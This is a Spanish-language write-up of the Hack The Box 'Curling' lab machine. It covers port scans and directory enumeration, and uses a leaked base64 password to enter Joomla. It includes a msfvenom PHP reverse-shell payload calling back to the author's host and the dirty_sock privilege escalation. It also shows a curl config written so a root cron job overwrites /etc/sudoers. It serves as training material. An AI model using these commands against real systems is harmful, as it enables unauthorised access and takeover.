@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box - Curling :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Nombre Curling     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.150   Maker L4mpje      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6.1,5.5,5.3,4.7,4.5] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/curling/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box - Curling :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Nombre Curling     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.150   Maker L4mpje      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6.1,5.5,5.3,4.7,4.5] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/curling/Screenshot%20from%202019-03-28%2021.14.49.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box - Curling :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Nombre Curling     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.150   Maker L4mpje      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6.1,5.5,5.3,4.7,4.5] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta property="og:url" content="https://sckull.github.io/posts/curling/" />
+<meta property="og:site_name" content="Hack The Box - Curling" />
+<meta property="og:image" content="https://sckull.github.io/../../image/htb/curling/Screenshot%20from%202019-03-28%2021.14.49.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-03-30 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/curling/">Hack The Box - Curling</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Saturday, Mar 30, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">Tags:
+        
+         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/masscan/">masscan</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/gobuster/">gobuster</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/dirty_sock/">dirty_sock</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/cve-2019-7304/">CVE-2019-7304</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/curl/">curl</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/writeup/">writeup</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/curling/../../image/htb/curling/Screenshot%20from%202019-03-28%2021.14.49.png" class="post-cover" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Nombre</th>
+<th>Curling</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OS</td>
+<td>Linux</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>20</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Facil</td>
+</tr>
+
+<tr>
+<td>IP</td>
+<td>10.10.10.150</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/29267">L4mpje</a></td>
+</tr>
+</tbody>
+</table>
+
+<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
+    <script>
+    new Chart(document.getElementById("radar-chart"), {
+    type: 'radar',
+    data: {
+      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
+      datasets: [
+        {
+          label: "User",
+          fill: true,
+          backgroundColor: "rgba(179,181,198,0.2)",
+          borderColor: "rgba(179,181,198,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(179,181,198,1)",
+          data: [6.1,5.5,5.3,4.7,4.5]
+        }, {
+          label: "Maker",
+          fill: true,
+          backgroundColor: "rgba(255,99,132,0.2)",
+          borderColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          data: [7,7,7,3,3]
+        }
+      ]
+    },
+    options: {
+      title: {
+        display: true,
+        text: 'Calificacion'
+      }
+    }
+});
+    </script>
+</div>
+
+<hr />
+
+<h2 id="masscan">MASSCAN</h2>
+
+<pre><code class="language-bash">root@sckull:~/htb/curling# masscan -p1-65535,U:1-65535 10.10.10.150 --rate=1000 -e tun0
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 80/tcp on 10.10.10.150                                    
+Discovered open port 22/tcp on 10.10.10.150 
+</code></pre>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Escaneo al puerto 80 y 22</p>
+
+<pre><code class="language-bash">Starting Nmap 7.70 ( https://nmap.org )
+Nmap scan report for 10.10.10.150
+Host is up (0.29s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
+|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
+|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Home
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.18 - 2.6.22
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT       ADDRESS
+1   707.63 ms 10.10.12.1
+2   707.82 ms 10.10.10.150
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds
+</code></pre>
+
+<hr />
+
+<h2 id="http-80">HTTP 80</h2>
+
+<p>Al visitar la pagina en el puerto 80 encontramos una pagina sencilla con varios post, en donde tambien vemos el nombre de <code>Floris</code> y Super User que puede referirse a <code>administrator</code>.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 18.19.34.png" alt="image" />
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 18.48.10.png" alt="image" />
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 18.21.02.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="gobuster">GOBUSTER</h2>
+
+<p>Escaneo de directorios y archivos html, php y txt.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/curling# gobuster -u http://10.10.10.150/ -w /usr/share/wordlists/dirb/common.txt -q -np -x html,php,txt -t 30
+/administrator (Status: 301)
+/bin (Status: 301)
+/cache (Status: 301)
+/components (Status: 301)
+/configuration.php (Status: 200)
+/images (Status: 301)
+/includes (Status: 301)
+/index.php (Status: 200)
+/index.php (Status: 200)
+/language (Status: 301)
+/layouts (Status: 301)
+/libraries (Status: 301)
+/LICENSE.txt (Status: 200)
+/media (Status: 301)
+/modules (Status: 301)
+/plugins (Status: 301)
+/README.txt (Status: 200)
+/secret.txt (Status: 200)
+/server-status (Status: 403)
+/templates (Status: 301)
+/tmp (Status: 301)
+/web.config.txt (Status: 200)
+</code></pre>
+
+<p>Dentro de los directorios y archivos encontrados vemos uno no muy comun <code>/secret.txt</code> al visitar la direccion nos encontramos con una cadena en base64.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 18.31.57.png" alt="image" /></p>
+
+<p>Al decodificar dicha cadena nos devuelve Curling2018! posiblemente una contraseña para uno de los dos usuarios administrator y floris. Al intentar con el usuario floris y la <code>contraseña</code> en <code>/secret.txt</code> nos logramos logear al panel de administracion de joomla.</p>
+
+<pre><code class="language-text">Username: floris
+Password: Curling2018!
+</code></pre>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 18.53.00.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="shell">SHELL</h2>
+
+<p>Ahora que tenemos acceso al panel de administracion podemos intentar obtener una shell mediante una extension <a href="https://www.youtube.com/watch?v=fh7ifo-Wldo"><strong>mod_simplefileupload</strong></a>. Primero debemos de generar nuestro payload con msfvenom y poner a la escucha nuestra maquina con multi/handler.</p>
+
+<hr />
+
+<h3 id="metasploit">Metasploit</h3>
+
+<pre><code class="language-bash">root@sckull:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.12.11 LPORT=7878 -o batman.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1112 bytes
+Saved as: batman.php
+root@sckull:~/htb/curling# msfconsole -q
+msf5 &gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+payload =&gt; php/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set LHOST 10.10.12.11
+LHOST =&gt; 10.10.12.11
+msf5 exploit(multi/handler) &gt; set LPORT 7878
+LPORT =&gt; 7878
+msf5 exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.12.11:7878
+</code></pre>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.02.44.png" alt="image" /></p>
+
+<p>Para subir nuestra extension nos dirigmos a <code>Extentions &gt; Manage &gt; Install &gt; Upload Package File</code>, elegimos nuestro paquete.
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 19.05.53.png" alt="image" /></p>
+
+<p>Luego nos dirigimos a <a href="http://10.10.10.150/modules/mod_simplefileuploadv1.3/elements/udd.php">http://10.10.10.150/modules/mod_simplefileuploadv1.3/elements/udd.php</a>, procedemos a subir nuestro payload y visitar la pagina donde se encuentra nuestro payload.
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 19.07.35.png" alt="image" />
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 19.08.26.png" alt="image" />
+Y obtenemos nuestra sesion meterpreter.</p>
+
+<h3 id="metasploit-sesion-meterpreter">Metasploit - Sesion Meterpreter</h3>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.09.43.png" alt="image" /></p>
+
+<p>En la carpeta /home/floris encontramos el flag <code>user.txt</code> pero no tenemos permisos para leerlo, pero encontramos un archivo con el nombre de <code>password_backup</code>.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.12.07.png" alt="image" /></p>
+
+<p>Utilizamos <code>xxd</code> para verificar el archivo, al consulatar la firma de archivos encontramos que es un archivo de tipo <code>bzip2</code>.</p>
+
+<p><a href="https://www.garykessler.net/library/file_sigs.html"><strong>File Signatures Table</strong></a></p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.27.18.png" alt="image" />
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 19.32.16.png" alt="image" /></p>
+
+<p>Utilizamos nuevamente xxd para escribir este archivo en /tmp.</p>
+
+<pre><code class="language-bash">xxd -r /home/floris/password_backup &gt; /tmp/backup.bz2
+</code></pre>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.31.23.png" alt="image" /></p>
+
+<p>Pasamos nuestro archivo a base64 para poder extraerlo localmente.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/curling# cat base64 | base64 -d &gt; backup.bz2
+root@sckull:~/htb/curling# bzip2 -d backup.bz2 
+root@sckull:~/htb/curling# ls
+backup  base64  batman.php  mod_simplefileuploadJ30v1.3.5.zip
+root@sckull:~/htb/curling# cat backup
+�l[password�r�BZh91AY&amp;SY6Ǎ����@@!PtD�� t&quot;d�hhOPIS@��6��8ET&gt;P@�#I bՃ|3��x���������(*N�&amp;�H��k1��x��&quot;�{�ೱ��]��B@�6�m��root@sckull:~/htb/curling# file backup
+backup: gzip compressed data, was &quot;password&quot;, last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
+root@sckull:~/htb/curling# mv backup file.gz
+root@sckull:~/htb/curling# gunzip file.gz 
+root@sckull:~/htb/curling# ls
+base64  batman.php  file  mod_simplefileuploadJ30v1.3.5.zip
+root@sckull:~/htb/curling# file file 
+file: bzip2 compressed data, block size = 900k
+root@sckull:~/htb/curling# bzip2 -d file.bz2 
+root@sckull:~/htb/curling# ls
+base64  batman.php  file  mod_simplefileuploadJ30v1.3.5.zip
+root@sckull:~/htb/curling# cat file 
+password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d&lt;wdCbdZu)|hChXll
+root@sckull:~/htb/curling# file file 
+file: POSIX tar archive (GNU)
+root@sckull:~/htb/curling# tar xvf file
+password.txt
+root@sckull:~/htb/curling# cat password.txt 
+5d&lt;wdCbdZu)|hChXll
+root@sckull:~/htb/curling#
+</code></pre>
+
+<p>Finalmente despues de pasar por varios archivos nos encontramos con una contraseña dentro del archivo <code>password.txt</code>, vamos a utilizarla para el usuario Floris en el servicio ssh y obtenemos nuestra bandera <code>user.txt</code>.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.46.48.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<p>Realizamos una enumeracion de posibles exploits con <code>linux-exploit-suggester</code> dentro del directorio /tmp, esto para facilitarnos una escalada de privilegios.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 19.56.56.png" alt="image" /></p>
+
+<p><a href="https://initblog.com/2019/dirty-sock/"><strong>Python Dirty Sock</strong></a></p>
+
+<p>Encontramos el <code>CVE-2019-7304</code> de <code>dirty_sock</code> que podria ayudarnos para escalar  privilegios, descargamos y ejecutamos nuestro exploit en /tmp, el cual nos creara un usario con privilegios root.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 20.03.23.png" alt="image" /></p>
+
+<p>Cambiamos de usuario con su al usuario <code>dirty_sock</code>, y obtenemos privilegios root y la bandera <code>root.txt</code>.</p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 20.07.11.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="privilege-escalation-v2">PRIVILEGE ESCALATION v2</h2>
+
+<p>Para esta <code>Curling</code> tenemos otra forma de obtener root, para ello utilizamos <code>pspy</code> para ver los cron que se ejecutan.
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 20.26.47.png" alt="image" /></p>
+
+<p>Observamos que hay uno cronjob que ejecuta un comando el cual copia un archivo llamado <code>default.txt</code> a <code>/home/floris/admin-area/input</code>.</p>
+
+<pre><code class="language-text">cat /root/default.txt &gt; /home/floris/admin-area/input
+</code></pre>
+
+<p>Y otro que hace uso de <code>curl</code> y mediante un archivo hace una consulta el cual lo guarda en <code>report</code>.</p>
+
+<pre><code class="language-bash">curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+</code></pre>
+
+<p>Sabiendo lo anterior podemos crear un archivo sudoers que contenga permisos de usuario root para el usuario <code>floris</code>, utilizar un servidor local para que el cron haga la consulta, descargue el archivo y lo guarde en el archivo de <code>sudoers</code>.</p>
+
+<p><code>sudoers</code>
+<img src="../../image/htb/curling/Screenshot from 2019-03-28 20.36.20.png" alt="image" /></p>
+
+<h3 id="python-http-server">Python HTTP Server ###</h3>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 20.35.42.png" alt="image" /></p>
+
+<p>Editamos el archivo input con lo siguiente:</p>
+
+<pre><code class="language-bash">url = &quot;http://10.10.12.11/sudoers&quot;
+output = &quot;/etc/sudoers&quot;
+</code></pre>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 20.41.11.png" alt="image" /></p>
+
+<p><img src="../../image/htb/curling/Screenshot from 2019-03-28 20.40.40.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://sckull.github.io/posts/vault/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Hack The Box - Vault</span>
+              </a>
+            </span>
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/frolic/">
+                <span class="button__text">Hack The Box - Frolic</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+</div>
+
+</body>
+</html>
